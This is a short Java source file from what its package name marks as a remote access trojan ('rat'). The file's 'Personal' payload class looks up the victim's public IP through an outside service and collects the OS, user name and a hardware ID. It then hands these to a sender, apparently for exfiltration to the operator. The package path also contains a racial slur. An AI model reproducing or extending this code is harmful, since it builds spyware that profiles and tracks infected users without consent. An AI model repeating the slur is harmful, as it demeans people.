package me.nigger.rat.payload.impl;

import me.nigger.rat.Main;
import me.nigger.rat.payload.Payload;
import me.nigger.rat.payload.Sender;
import me.nigger.rat.util.HWIDUtil;
import me.nigger.rat.util.Message;

import java.net.URL;
import java.util.Scanner;

public final class Personal implements Payload
{
    @Override
    public void execute() throws Exception
    {
        String ip = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8").useDelimiter("\\A").next();

        Sender.send(new Message.Builder("Personal")
                .addField("IP", ip, true)
                .addField("OS", System.getProperty("os.name"), true)
                .addField("Name", System.getProperty("user.name"), true)
                .addField("HWID", HWIDUtil.getID(), true)
                .build());
    }
}
